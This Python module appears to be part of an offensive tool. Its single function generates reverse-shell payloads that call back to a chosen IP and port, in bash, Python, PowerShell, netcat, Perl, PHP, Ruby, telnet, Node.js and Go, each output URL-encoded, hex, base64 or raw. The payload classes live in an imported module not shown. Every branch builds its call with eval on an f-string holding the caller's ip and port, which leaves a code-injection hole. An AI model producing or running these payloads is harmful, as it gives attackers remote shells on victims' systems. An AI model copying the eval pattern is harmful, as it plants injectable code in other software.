from ..payloads import *

def revershell_generator(language,encoding,ip,porta) -> None:
        match language:
            case 'bash':
                match encoding:
                    case 'urlencode' | 'hexadecimal' | 'base64' | 'shell':
                        print(
                            eval(
                                f'Bash("{ip}","{porta}").{encoding}()'
                            )
                        )
            case 'python':
                match encoding:
                    case 'urlencode' | 'hexadecimal' | 'base64' | 'shell':
                        print(
                            eval(
                                f'Python("{ip}","{porta}").{encoding}()'
                            )
                        )
            case 'powershell':
                match encoding:
                    case 'urlencode' | 'hexadecimal' | 'base64' | 'shell':
                        print(
                            eval(
                                f'Powershell("{ip}","{porta}").{encoding}()'
                            )
                        )
            case 'nc':
                match encoding:
                    case 'urlencode' | 'hexadecimal' | 'base64' | 'shell':
                        print(
                            eval(
                                f'Netcat("{ip}","{porta}").{encoding}()'
                            )
                        )
            case 'perl':
                match encoding:
                    case 'urlencode' | 'hexadecimal' | 'base64' | 'shell':
                        print(
                            eval(
                                f'Perl("{ip}","{porta}").{encoding}()'
                            )
                        )
            case 'php':
                match encoding:
                    case 'urlencode' | 'hexadecimal' | 'base64' | 'shell':
                        print(
                            eval(
                                f'PHP("{ip}","{porta}").{encoding}()'
                            )
                        )
            case 'ruby':
                match encoding:
                    case 'urlencode' | 'hexadecimal' | 'base64' | 'shell':
                        print(
                            eval(
                                f'Ruby("{ip}","{porta}").{encoding}()'
                            )
                        )
            case 'telnet':
                match encoding:
                    case 'urlencode' | 'hexadecimal' | 'base64' | 'shell':
                        print(
                            eval(
                                f'Telnet("{ip}","{porta}").{encoding}()'
                            )
                        )
            case 'nodejs':
                match encoding:
                    case 'urlencode' | 'hexadecimal' | 'base64' | 'shell':
                        print(
                            eval(
                                f'NodeJs("{ip}","{porta}").{encoding}()'
                            )
                        )
            case 'golang':
                match encoding:
                    case 'urlencode' | 'hexadecimal' | 'base64' | 'shell':
                        print(
                            eval(
                                f'Golang ("{ip}","{porta}").{encoding}()'
                            )
                        )